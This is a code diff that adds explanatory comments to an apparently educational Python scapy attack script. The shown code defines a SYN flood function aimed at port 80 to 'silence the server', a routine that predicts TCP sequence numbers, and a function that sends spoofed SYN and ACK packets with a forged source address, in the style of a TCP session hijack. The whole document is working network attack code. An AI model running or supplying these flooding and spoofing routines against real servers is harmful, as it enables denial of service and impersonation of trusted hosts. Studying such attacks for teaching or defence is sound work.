@@ -11,7 +11,7 @@ def SynAttack(src, target):
 		IPlayer = IP(src=src, dst=target)
 		TCPlayer = TCP(sport=sport, dport=80)	# Will attack the server on port 80
 		pkt = IPlayer / TCPlayer
-		send(pkt)
+		send(pkt)				# Will continously send the SYN packet to silence the server
 
 # Will grab the sequence number of the TCP packets sent, after grabbing the increasing numbers, subtract them, then will tell the difference
 def callTSN(target):
@@ -24,7 +24,7 @@ def callTSN(target):
 		pkt = IP(dst=target)
 		ans = sr1(pkt, verbose=0)
 		PredictSequence = ans.getlayer(TCP).seq		# May or may not work, depending on the enviroment run on
-		diffSeq = PredictSequence - repNum
+		diffSeq = PredictSequence - repNum		# Will subtract two TCP sequence numbers to find the difference
 		print '\t[+] TCP Sequence Difference: ' + str(diffSeq)
 	return PredictSequence + diffSeq
 
@@ -33,11 +33,11 @@ def callTSN(target):
 def AttemptSpoof(src, target, ack):
 	IPlayer = IP(src=src, dst=target)
 	TCPlayer = TCP(sport=80, dport=81)
-	synPkt = IPlayer / TCPlayer
+	synPkt = IPlayer / TCPlayer		# The creation of the SYN Packet
 	send(synPkt)				# (Sending the SYN Packet)
 	IPlayer = IP(src=src, dst=target)
 	TCPlayer = TCP(sport=80, dport=81)
-	ackPkt = IPlayer / TCPlayer
+	ackPkt = IPlayer / TCPlayer		# The creation of the ACK Packet
 	send(ackPkt)				# (Sending the ACK Packet)
 
 def main():
